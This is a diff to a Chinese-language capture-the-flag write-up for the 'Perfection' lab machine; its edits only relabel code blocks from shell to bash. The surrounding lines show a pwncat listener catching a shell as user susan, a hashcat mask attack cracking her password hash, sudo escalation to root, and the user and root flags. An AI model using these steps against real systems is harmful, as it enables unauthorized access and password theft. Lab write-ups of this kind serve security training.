@@ -84,7 +84,7 @@ grade1=1&weight1=100&category2=as&grade2=1&weight2=0&category3=as&grade3=1&weigh
 
 ## User - susan
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [10:25:46] Welcome to pwncat 🐈!
@@ -97,14 +97,14 @@ susan
 
 ### flag - user
 
-```shell
+```bash
 (remote) susan@perfection:/home/susan$ cat user.txt
 ca7858ea6597f30db9a3318e380a8447
 ```
 
 ### 环境探测
 
-```shell
+```bash
 (remote) susan@perfection:/home/susan$ ls -lah
 total 48K
 drwxr-x--- 7 susan susan 4.0K Feb 26 09:41 .
@@ -160,14 +160,14 @@ Please hit me with updates on the migration when you can. I am currently registe
 
 ### 密码哈希爆破
 
-```shell
+```bash
 PS D:\_Tools\hashcat-6.2.6> .\hashcat.exe -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d --show
 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
 ```
 
 得到密码之后，就可以访问 `sudo` 了
 
-```shell
+```bash
 (remote) susan@perfection:/var/spool/mail$ sudo -l
 [sudo] password for susan: <susan_nasus_413759210>
 Matching Defaults entries for susan on perfection:
@@ -179,7 +179,7 @@ User susan may run the following commands on perfection:
 
 ## User - root
 
-```shell
+```bash
 (remote) susan@perfection:/var/spool/mail$ sudo -i
 root@perfection:~# whoami
 root
@@ -187,7 +187,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@perfection:~# cat root.txt
 49af4f82e3665ca3d0f3187ea474e5f8
 ```
